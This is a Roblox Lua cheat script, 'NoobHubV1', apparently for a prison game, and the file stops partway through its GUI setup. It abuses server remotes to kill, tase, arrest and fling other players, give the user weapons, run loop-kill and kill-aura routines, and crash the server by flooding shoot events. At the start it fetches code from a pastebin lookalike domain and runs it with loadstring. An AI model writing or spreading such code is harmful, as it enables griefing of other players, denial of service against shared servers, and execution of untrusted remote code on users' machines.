local Players = game.Players
local plr = Players.LocalPlayer
local char = plr.CharacterAdded
local BuyGamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(tonumber((plr.CharacterAppearance):split('=')[#((plr.CharacterAppearance):split('='))]), 96651)
local Flinger = loadstring(game:HttpGet("https://pastebinp.com/raw/HWH951dz"))()

function Tween(Obj, Prop, New, Time)
	if not Time then
		Time = .5
	end
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(
		Time, 
		Enum.EasingStyle.Quart, 
		Enum.EasingDirection.Out, 
		0, 
		false,
		0
	)
	local propertyTable = {
		[Prop] = New,
	}

	TweenService:Create(Obj, info, propertyTable):Play()
end

function Notif(Text,Dur)
	task.spawn(function()
		if not Dur then
			Dur = 1.5
		end
		local Notif = Instance.new("ScreenGui")
		local Frame_1 = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		Notif.Parent = (game:GetService("CoreGui") or gethui())
		Notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		Frame_1.Parent = Notif
		Frame_1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame_1.BackgroundTransparency=1
		Frame_1.BorderSizePixel = 0
		Frame_1.Position = UDim2.new(0, 0, 0.0500000007, 0)
		Frame_1.Size = UDim2.new(1, 0, 0.100000001, 0)
		TextLabel.Parent = Frame_1
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.TextTransparency =1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.Highway
		TextLabel.Text = Text or "Text not found"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 21.000
		Tween(Frame_1,"BackgroundTransparency",0.350,.5)
		Tween(TextLabel,"TextTransparency",0,.5)
		wait(Dur+.7)
		Tween(Frame_1,"BackgroundTransparency",1,.5)
		Tween(TextLabel,"TextTransparency",1,.5)
		wait(.7)
		Notif:Destroy()
	end)
	return
end

function GetPlayer(Player)
        local function findPlayer(stringg)
		if (stringg == ("me")) then
			return plr
		else
		        for _,player in pairs(game.Players:GetPlayers()) do
			        if (stringg:lower() == (player.Name:lower()):sub(1, #stringg)) or (stringg:lower() == (player.DisplayName:lower()):sub(1, #stringg)) then
					return player
				end
		        end
	        end
	end
	return findPlayer(Player)
end

function TPCFrame(Arg2)
	plr.Character.HumanoidRootPart.CFrame = Arg2
end

local function savePos()
	return plr.Character.HumanoidRootPart.CFrame
end

local function savecamPos()
	return workspace["CurrentCamera"].CFrame
end

local function saveteam()
	return plr.Team
end

local function Criminal()
	local savedcf = savePos()
	local savedcamcf = savecamPos()
	if plr.Team == game.Teams.Guards then
	TPCFrame(CFrame.new(-919.958, 95.327, 2138.189))
	char:Wait() wait(0.06)
	TPCFrame(savedcf)
	workspace["CurrentCamera"].CFrame = savedcamcf
	elseif plr.Team == game.Teams.Inmates then
	TPCFrame(CFrame.new(-919.958, 95.327, 2138.189))
	task.wait()
        TPCFrame(savedcf)
	end
end

local ChangeTeam = function(Team)
                        local savedcf = savePos()
	                local savedcamcf = savecamPos()
                        if Team == game.Teams.Criminals then
                        workspace.Remote.TeamEvent:FireServer("Bright blue")
		        char:Wait() wait(0.06)
                        TPCFrame(CFrame.new(-919.958, 95.327, 2138.189))
                        char:Wait() wait(0.06)
                        TPCFrame(savedcf)
		        workspace["CurrentCamera"].CFrame = savedcamcf
                        elseif Team == game.Teams.Guards then
                        workspace.Remote.TeamEvent:FireServer("Bright blue")
                        char:Wait() wait(0.06)
                        TPCFrame(savedcf)
		        workspace["CurrentCamera"].CFrame = savedcamcf
                        elseif Team == game.Teams.Inmates then
                        workspace.Remote.TeamEvent:FireServer("Bright orange")
                        char:Wait() wait(0.06)
                        TPCFrame(savedcf)
		        workspace["CurrentCamera"].CFrame = savedcamcf
	                elseif Team == game.Teams.Neutral then
		        workspace.Remote.TeamEvent:FireServer("Medium stone grey")
                        end
end

local function GiveItem(Item)
        if Item == "Remington 870" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.giver["Remington 870"]})
        elseif Item == "Hammer" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Hammer"]})
        elseif Item == "Knife" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
        elseif Item == "AK-47" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.giver["AK-47"]})
        elseif Item == "M9" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.giver["M9"]})
        elseif Item == "M4A1" then
                Workspace.Remote.ItemHandler:InvokeServer({Position=game.Players.LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.giver["M4A1"]})
        end
end

local function Kill(Player)
        local events = {}
	local gun = nil
	GiveItem("AK-47")
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
			gun = v
		end
	end
	if gun == nil then
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
				gun = v
			end
		end
	end
	coroutine.wrap(function()
		for i = 1,50 do
			game.ReplicatedStorage.ReloadEvent:FireServer(gun)
			task.wait()
		end
	end)()
	for i = 1,5 do
		events[#events + 1] = {
			Hit = Player.Character:FindFirstChild("Head") or Player.Character:FindFirstChildOfClass("Part"),
			Cframe = CFrame.new(),
			RayObject = Ray.new(Vector3.new(), Vector3.new()),
			Distance = 0
		}
	end
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
end

local KillTeam = function(Team)
	local events = {}
	local gun = nil
	GiveItem("AK-47")
	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= game.Players.LocalPlayer and v.TeamColor.Name == Team then
			if v.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
				local savedcf = GetOrientation()
				local camcf = workspace.CurrentCamera.CFrame
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
				workspace.CurrentCamera.CFrame = camcf
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
			for i = 1,10 do
				events[#events + 1] = {
					Hit = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					Cframe = CFrame.new(),
					RayObject = Ray.new(Vector3.new(), Vector3.new()),
					Distance = 0
				}
			end
		end
	end
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
			gun = v
		end
	end
	if gun == nil then
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
				gun = v
			end
		end
	end
	coroutine.wrap(function()
		for i = 1,50 do
			game.ReplicatedStorage.ReloadEvent:FireServer(gun)
			task.wait()
		end
	end)()
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
end

local function Kill2Team(Team1, Team2)
	local events = {}
	local gun = nil
	GiveItem("AK-47")
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.TeamColor.Name == Team1 or v.TeamColor.Name == Team2 then
			if v.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
				local savedcf = GetOrientation()
				local camcf = workspace.CurrentCamera.CFrame
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
				workspace.CurrentCamera.CFrame = camcf
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
			for i = 1,10 do
				events[#events + 1] = {
					Hit = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					Cframe = CFrame.new(),
					RayObject = Ray.new(Vector3.new(), Vector3.new()),
					Distance = 0
				}
			end
		end
	end
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
			gun = v
		end
	end
	if gun == nil then
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name ~= "Taser" and v:FindFirstChild("GunStates") then
				gun = v
			end
		end
	end
	coroutine.wrap(function()
		for i = 1,50 do
			game.ReplicatedStorage.ReloadEvent:FireServer(gun)
			task.wait()
		end
	end)()
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
end

local function CheckTeamKill(Player)
        local Player = GetPlayer(Player)
	if Player.Character.Humanoid.Health == 0 or Player.Character:FindFirstChild("ForceField") then -- nothing
	else
        if Player.Team == game.Teams.Inmates then
	if plr.Team == game.Teams.Inmates then
	Criminal()
	task.wait(0.15)
	Kill(Player)
	elseif plr.Team == game.Teams.Guards then
	Criminal()
	task.wait(0.25)
	Kill(Player)
	elseif plr.Team == game.Teams.Criminals then
	Kill(Player)
	end
        elseif Player.Team == game.Teams.Guards then
        if plr.Team == game.Teams.Guards then
        Criminal()
        task.wait(0.4)
        Kill(Player)
        elseif plr.Team == game.Teams.Criminals then
        Kill(Player)
        elseif plr.Team == game.Teams.Inmates then
        Kill(Player)
        end
        elseif Player.Team == game.Teams.Criminals then
        if plr.Team == game.Teams.Guards then
        ChangeTeam(game.Teams.Inmates)
        task.wait(0.3)
        Kill(Player)
        elseif plr.Team == game.Teams.Criminals then
        ChangeTeam(game.Teams.Inmates)
        task.wait(0.3)
        Kill(Player)
        elseif plr.Team == game.Teams.Inmates then
        Kill(Player)
	end
        end
	end
end

local KillInmates = function()
	for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
	if v ~= plr then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	if plr.Team == game.Teams.Criminals then
	KillTeam(BrickColor.new("Bright orange").Name)
	elseif plr.Team == game.Teams.Guards then
	Criminal()
	task.wait(0.45)
	KillTeam(BrickColor.new("Bright orange").Name)
	elseif plr.Team == game.Teams.Inmates then
	Criminal()
	task.wait(0.15)
	KillTeam(BrickColor.new("Bright orange").Name)
	end
	end
	end
	end
end

local function KillGuards()
	for i,v in pairs(game.Teams.Guards:GetPlayers()) do
	if v ~= plr then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	if plr.Team == game.Teams.Guards then
	ChangeTeam(game.Teams.Inmates)
	task.wait(0.15)
	KillTeam(BrickColor.new("Bright blue").Name)
	elseif plr.Team == game.Teams.Inmates then
	KillTeam(BrickColor.new("Bright blue").Name)
	elseif plr.Team == game.Teams.Criminals then
	KillTeam(BrickColor.new("Bright blue").Name)
	end
	end
	end
	end
end

local KillCriminals = function()
	for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
	if v ~= plr then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	if plr.Team == game.Teams.Criminals or plr.Team == game.Teams.Guards then
        ChangeTeam(game.Teams.Inmates)
	task.wait(0.2)
        KillTeam(BrickColor.new("Really red").Name)
	elseif plr.Team == game.Teams.Inmates then
	KillTeam(BrickColor.new("Really red").Name)
	end
	end
	end
	end
end

local KillCriminalsAndGuards = function()
	for i,v in pairs(game.Players:GetPlayers()) do
	if v ~= plr then
	if v.Team == game.Teams.Guards or v.Team == game.Teams.Criminals then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	if plr.Team == game.Teams.Criminals or plr.Team == game.Teams.Guards then
        ChangeTeam(game.Teams.Inmates)
	task.wait(0.2)
        Kill2Team(BrickColor.new("Really red").Name, BrickColor.new("Bright blue").Name)
	elseif plr.Team == game.Teams.Inmates then
	Kill2Team(BrickColor.new("Really red").Name, BrickColor.new("Bright blue").Name)
	end
	end
	end
	end
	end
end

local function KillAll()
	for _,v in pairs(game.Players:GetPlayers()) do
	if v ~= plr then
	if v.Team == game.Teams.Guards or v.Team == game.Teams.Criminals then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	KillCriminalsAndGuards()
	end
	end
	end
	end
	task.wait(0.1)
	for _,v in pairs(game.Players:GetPlayers()) do
	if v ~= plr then
	if v.Team == game.Teams.Inmates then
	if v.Character.Humanoid.Health == 0 or v.Character:FindFirstChild("ForceField") then -- nothing
	else
	KillInmates()
	end
	end
	end
	end
end

local function AllGuns()
        if BuyGamepass then
	GiveItem("AK-47")
	GiveItem("Remington 870")
	GiveItem("M9")
	GiveItem("M4A1")
	else
	GiveItem("AK-47")
	GiveItem("Remington 870")
	GiveItem("M9")
	end
end

local function Aura()
	for i, v in pairs(game.Players:GetPlayers()) do
	        if v ~= plr then
			 game.ReplicatedStorage.meleeEvent:FireServer(v)
	        end
	end
end
 
local function ServerCrash()
	task.spawn(function()
	getgenv().Loop = true
	while Loop do
local Gun = "Remington 870"

local Player = game.Players.LocalPlayer.Name

GiveItem(Gun)

for i,v in pairs(game.Players[ Player ].Backpack:GetChildren()) do
    if v.name == (Gun) then
        v.Parent = game.Players.LocalPlayer.Character
    end
end

Gun = game.Players[ Player ].Character[ Gun ]

plr.Character.Humanoid:UnequipTools()

function FireGun(target)
coroutine.resume(coroutine.create(function()
local bulletTable = {}
table.insert(bulletTable, {
Hit = target,
Distance = 100,
Cframe = CFrame.new(0,1,1),
RayObject = Ray.new(Vector3.new(0.1,0.2), Vector3.new(0.3,0.4))
})
game.ReplicatedStorage.ShootEvent:FireServer(bulletTable, Gun)
wait()
end))
end

while game:GetService("RunService").Stepped:wait() do
for count = 0, 10, 10 do
FireGun()
end
end
task.wait()
	wait()
	end
	end)
end

local function FF()
	if plr.Character:FindFirstChild("ForceField") then
	-- nothing
	else
	ChangeTeam(plr.Team)
	end
end

local function View(Player)
	local Player = GetPlayer(Player)
	workspace["CurrentCamera"].CameraSubject = Player.Character
end

local function Antifling()
        local function isPartRotatingTooFast(part)
		if part and part:IsA("BasePart") then
			local lastRotation = part.Rotation
			wait(0.1) -- Wait a short time to get a second rotation value for comparison
			local currentRotation = part.Rotation
			local rotationChange = (currentRotation - lastRotation).Magnitude
			return rotationChange > rotationThreshold
		end
		return false
	end

	local function isPartInLocalPlayerCharacter(part)
		local localPlayer = game.Players.LocalPlayer
		if localPlayer and localPlayer.Character then
			return part:IsDescendantOf(localPlayer.Character)
		end
		return false
	end

	local function createSelectionBox(target)
		local outline = Instance.new("SelectionBox")
		outline.Name = "RedOutline"
		outline.Color3 = outlineColor.Color
		outline.Adornee = target
		outline.Parent = target
		return outline
	end

local G = {}
local C = nil

	local function Collide(plr)
	if plr and plr.Character and plr ~= game.Players.LocalPlayer then
	for i,v in pairs (plr.Character:GetDescendants()) do
	if v:IsA"BasePart" and v.CanCollide == true then
	v.CanCollide = false
     v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
	end
	end
	end
	end
	
	local function Enable()
	for i,v in pairs (Players:GetPlayers()) do
	Collide(v)
	end
	end
	
	Notif("Anti Fling Executed",8)

function G:Enable()
	C = game:GetService"RunService".RenderStepped: Connect (Enable)
        end
function G:Disable()
   C: Disconnect ()
for i,v in pairs(Players:GetPlayers()) do
if v ~= plr then
for h,b in pairs(v.Character:GetDescendants()) do
if b:IsA"BasePart" and b.CanCollide == false then
b.CanCollide = true
end
end
end
end
end

G:Enable()
return G
end

local function Fling(Player)
     if Player:lower() == "all" then
     Flinger:GetTarget(Player)
     Flinger:flingAll()
     else
     Flinger:GetTarget(Player)
     Flinger:Fling()
     end
end

local function Tase(Player)
        local events = {}
	local gun = nil
	local savedteam = saveteam()
	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= plr and v == Player then
			events[#events + 1] = {
				Hit = v.Character:FindFirstChildOfClass("Part"),
				Cframe = CFrame.new(),
				RayObject = Ray.new(Vector3.new(), Vector3.new()),
				Distance = 0
			}
		end
	end
	if not game.Players.LocalPlayer.Character:FindFirstChild("Taser") and not game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Taser") then
		savedteam = saveteam()
		ChangeTeam(game.Teams.Guards)
	end
	gun = game.Players.LocalPlayer.Character:FindFirstChild("Taser") or game.Players.LocalPlayer.Backpack:FindFirstChild("Taser")
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
	ChangeTeam(savedteam)
end

local function TaseTeam(Team)
	local events = {}
	local gun = nil
	local savedteam = saveteam()
	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= plr and v.Team == Team then
			events[#events + 1] = {
				Hit = v.Character:FindFirstChildOfClass("Part"),
				Cframe = CFrame.new(),
				RayObject = Ray.new(Vector3.new(), Vector3.new()),
				Distance = 0
			}
		end
	end
	if not game.Players.LocalPlayer.Character:FindFirstChild("Taser") and not game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Taser") then
		savedteam = saveteam()
		ChangeTeam(game.Teams.Guards)
	end
	gun = game.Players.LocalPlayer.Character:FindFirstChild("Taser") or game.Players.LocalPlayer.Backpack:FindFirstChild("Taser")
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
	ChangeTeam(savedteam)
end

local function TaseAll()
	local events = {}
	local gun = nil
	local savedteam = saveteam()
	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= plr then
			events[#events + 1] = {
				Hit = v.Character:FindFirstChildOfClass("Part"),
				Cframe = CFrame.new(),
				RayObject = Ray.new(Vector3.new(), Vector3.new()),
				Distance = 0
			}
		end
	end
	if not game.Players.LocalPlayer.Character:FindFirstChild("Taser") and not game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Taser") then
		savedteam = saveteam()
		ChangeTeam(game.Teams.Guards)
	end
	gun = game.Players.LocalPlayer.Character:FindFirstChild("Taser") or game.Players.LocalPlayer.Backpack:FindFirstChild("Taser")
	game.ReplicatedStorage.ShootEvent:FireServer(events, gun)
	ChangeTeam(savedteam)
end

local function Goto(Player)
	TPCFrame(Player.Character.HumanoidRootPart.CFrame)
end

function Arrest(Player, Time)
	if Player.Character.Humanoid.Health == 0 then -- nothing
	else
	local Time = Time or 1
	local savedcf = savePos()
	local savedcamcf = savecamPos()
	if Player then
		repeat task.wait()
			Goto(Player)
			for i = 1,Time do
				coroutine.wrap(function()
					workspace.Remote.arrest:InvokeServer(Player.Character.Head)
				end)()
			end
		until Player.Character.Head:FindFirstChild("handcuffedGui")
		task.wait()
	end
	game.Players.LocalPlayer.Character.Humanoid.Sit = false
	TPCFrame(savedcf)
	workspace.CurrentCamera.CFrame = savedcamcf
	end
end

local function MeleeEvent(Player)
	game.ReplicatedStorage.meleeEvent:FireServer(Player)
end

local function MeleeKill(Player)
	local savedcf = savePos()
        for i,v in pairs(Players:GetPlayers()) do
                    pcall(function()
                        if v == Player and not v.Character:FindFirstChildOfClass("ForceField") and v.Character.Humanoid.Health > 0 then
                            while v.Character:WaitForChild("Humanoid").Health > 0 do
                                task.wait()
				plr.Character.Humanoid.Sit = false
                                Goto(v)
				MeleeEvent(v)
                            end
			TPCFrame(savedcf)
                        end
                    end)
                    task.wait()
	end
end
	
function A() spawn(function() while getgenv().autore do if plr.Character.Humanoid.Health <= 15 then ChangeTeam(plr.Team) end
wait()
end
end)
end

function U() spawn(function() while getgenv().loopkillall do KillAll()
task.wait(0.5)
end
end)
end

function C() spawn(function() while getgenv().loopkillinmates do KillInmates()
task.wait()
end
end)
end

function G() spawn(function() while getgenv().loopkillguards do KillGuards()
task.wait()
end
end)
end

function D() spawn(function() while getgenv().loopkillcriminals do KillCriminals()
task.wait()
end
end)
end

function H(Player) spawn(function() while getgenv().loopkillplayer do CheckTeamKill(Player)
task.wait()
end
end)
end

function Y() spawn(function() while getgenv().autoguns do AllGuns()
task.wait()
end
end)
end

function F() spawn(function() while getgenv().killaura do Aura()
task.wait()
 end
end)
end

function K() spawn(function() while getgenv().ff do FF()
task.wait(0.1)
end
end)
end

function M(Player) spawn(function() while getgenv().viewplayer do View(Player)
task.wait()
end
end)
end

function E(Player) spawn(function() while getgenv().loopfling do Fling(Player)
task.wait(1)
end
end)
end

function T() spawn(function() while getgenv().loopmkillall do for i,v in pairs(game.Players:GetPlayers()) do if v ~= plr then MeleeKill(v) end end
task.wait()
end
end)
end

function O() spawn(function() while getgenv().loopmkillinmates do for i,v in pairs(game.Teams.Inmates:GetPlayers()) do if v ~= plr then MeleeKill(v) end end
task.wait()
end
end)
end

function X() spawn(function() while getgenv().loopmkillguards do for i,v in pairs(game.Teams.Guards:GetPlayers()) do if v ~= plr then MeleeKill(v) end end
task.wait()
end
end)
end

function Z() spawn(function() while getgenv().loopmkillcriminals do for i,v in pairs(game.Teams.Criminals:GetPlayers()) do if v ~= plr then MeleeKill(v) end end
task.wait()
end
end)
end

function I(Player) spawn(function() while getgenv().loopmkillplayer do MeleeKill(Player)
task.wait()
end
end)
end

local NoobHubV1 = Instance.new("ScreenGui")
local destroy = Instance.new("TextButton")
local open = Instance.new("TextButton")
local close = Instance.new("TextButton")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local line = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local scripts = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local Refresh = Instance.new("TextButton")
local AutoRespawn = Instance.new("TextButton")
local UnautoRespawn = Instance.new("TextButton")
local Kill = Instance.new("TextButton")
local Loopkill = Instance.new("TextButton")
local Unloopkill = Instance.new("TextButton")
local AutoGuns = Instance.new("TextButton")
local UnautoGuns = Instance.new("TextButton")
local AllGuns = Instance.new("TextButton")
local Inmate = Instance.new("TextButton")
local Guard = Instance.new("TextButton")
local Criminal = Instance.new("TextButton")
local Neutral = Instance.new("TextButton")
local KillAura = Instance.new("TextButton")
local UnkillAura = Instance.new("TextButton")
local Servercrash = Instance.new("TextButton")
local ff = Instance.new("TextButton")
local unff = Instance.new("TextButton")
local view = Instance.new("TextButton")
local unview = Instance.new("TextButton")
local antifling = Instance.new("TextButton")
local fling = Instance.new("TextButton")
local loopfling = Instance.new("TextButton")
local unloopfling = Instance.new("TextButton")
local tase = Instance.new("TextButton")
local arrest = Instance.new("TextButton")
local meleekill = Instance.new("TextButton")
local goto = Instance.new("TextButton")
local meleelk = Instance.new("TextButton")
local unmeleelk = Instance.new("TextButton")
local saveposition = Instance.new("TextButton")
local loadposition = Instance.new("TextButton")
local player = Instance.new("TextBox")

--Properties:

NoobHubV1.Name = "NoobHubV1"
NoobHubV1.Parent = game.CoreGui
NoobHubV1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

destroy.Name = "destroy"
destroy.Parent = NoobHubV1
destroy.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
destroy.Position = UDim2.new(0, 0, 0.533834577, 0)
destroy.BorderSizePixel = 0
destroy.Size = UDim2.new(0, 100, 0, 40)
destroy.Visible = true
destroy.Font = Enum.Font.Roboto
destroy.Text = "destroy"
destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
destroy.TextSize = 14.000
destroy.MouseButton1Click:Connect(function()
NoobHubV1:Destroy()
end)

open.Name = "open"
open.Parent = NoobHubV1
open.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
open.BorderSizePixel = 0
open.Size = UDim2.new(0, 100, 0, 40)
open.Visible = true
open.Font = Enum.Font.Roboto
open.Text = "Open"
open.TextColor3 = Color3.fromRGB(255, 255, 255)
open.TextSize = 14.000
open.MouseButton1Click:Connect(function()
open.Visible = false
close.Visible = true
main.Visible = true
end)

close.Name = "close"
close.Parent = NoobHubV1
close.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
close.BorderSizePixel = 0
close.Size = UDim2.new(0, 100, 0, 40)
close.Visible = false
close.Font = Enum.Font.Roboto
close.Text = "Close"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextSize = 14.000
close.MouseButton1Click:Connect(function()
open.Visible = true
close.Visible = false
main.Visible = false
end)

main.Name = "main"
main.Parent = NoobHubV1
main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
main.BackgroundTransparency = 0.3
main.BorderSizePixel = 0
main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
main.Size = UDim2.new(0, 425, 0, 339)
main.Visible = false
main.Active = true

local UserInputService = game:GetService("UserInputService")

local gui = main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 134, 0, 25)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "NoobHubV1"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 17.000

line.Name = "line"
line.Parent = main
line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
line.BorderSizePixel = 0
line.Position = UDim2.new(0, 0, 0.106986806, 0)
line.Size = UDim2.new(0, 325, 0, 6)

ImageLabel.Parent = main
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 25, 0, 25)
ImageLabel.Image = "http://www.roblox.com/asset/?id=4483345998"
ImageLabel.ScaleType = Enum.ScaleType.Fit

scripts.Name = "scripts"
scripts.Parent = main
scripts.Active = true
scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
scripts.BackgroundTransparency = 1
scripts.BorderSizePixel = 0
scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
scripts.Size = UDim2.new(0, 425, 0, 273)
scripts.CanvasSize = UDim2.new(0, 0, 1.150, 0)

UIGridLayout.Parent = scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 100, 0, 30)

Refresh.Name = "Refresh"
Refresh.Parent = scripts
Refresh.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Refresh.BorderSizePixel = 0
Refresh.Size = UDim2.new(0, 200, 0, 50)
Refresh.Font = Enum.Font.Roboto
Refresh.Text = "Respawn"
Refresh.TextColor3 = Color3.fromRGB(255, 255, 255)
Refresh.TextSize = 14.000

AutoRespawn.Name = "AutoRespawn"
AutoRespawn.Parent = scripts
AutoRespawn.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
AutoRespawn.BorderSizePixel = 0
AutoRespawn.Size = UDim2.new(0, 200, 0, 50)
AutoRespawn.Visible = false
AutoRespawn.Font = Enum.Font.Roboto
AutoRespawn.Text = "Auto Respawn: On"
AutoRespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoRespawn.TextSize = 14.000

UnautoRespawn.Name = "UnautoRespawn"
UnautoRespawn.Parent = scripts
UnautoRespawn.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
UnautoRespawn.BorderSizePixel = 0
UnautoRespawn.Size = UDim2.new(0, 200, 0, 50)
UnautoRespawn.Font = Enum.Font.Roboto
UnautoRespawn.Text = "Auto Respawn"
UnautoRespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
UnautoRespawn.TextSize = 14.000

Kill.Name = "Kill"
Kill.Parent = scripts
Kill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Kill.BorderSizePixel = 0
Kill.Size = UDim2.new(0, 200, 0, 50)
Kill.Font = Enum.Font.Roboto
Kill.Text = "Kill"
Kill.TextColor3 = Color3.fromRGB(255, 255, 255)
Kill.TextSize = 14.000

Loopkill.Name = "Loopkill"
Loopkill.Parent = scripts
Loopkill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Loopkill.BorderSizePixel = 0
Loopkill.Size = UDim2.new(0, 200, 0, 50)
Loopkill.Font = Enum.Font.Roboto
Loopkill.Text = "Loopkill"
Loopkill.TextColor3 = Color3.fromRGB(255, 255, 255)
Loopkill.TextSize = 14.000

Unloopkill.Name = "Unloopkill"
Unloopkill.Parent = scripts
Unloopkill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
Unloopkill.BorderSizePixel = 0
Unloopkill.Size = UDim2.new(0, 200, 0, 50)
Unloopkill.Visible = false
Unloopkill.Font = Enum.Font.Roboto
Unloopkill.Text = "Unloopkill"
Unloopkill.TextColor3 = Color3.fromRGB(255, 255, 255)
Unloopkill.TextSize = 14.000

AutoGuns.Name = "AutoGuns"
AutoGuns.Parent = scripts
AutoGuns.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
